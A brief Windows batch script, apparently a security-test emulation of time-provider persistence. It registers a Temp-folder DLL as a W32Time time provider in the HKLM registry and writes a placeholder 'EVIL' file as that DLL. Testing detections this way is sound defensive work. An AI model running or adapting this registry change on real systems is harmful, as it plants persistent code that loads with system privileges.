@echo off
reg add HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\T1547003001 /v "DllName" /t REG_EXPAND_SZ /d %%systemroot%%\Temp\T1547003001.dll /f
echo "EVIL" >> C:\Windows\Temp\T1547003001.dll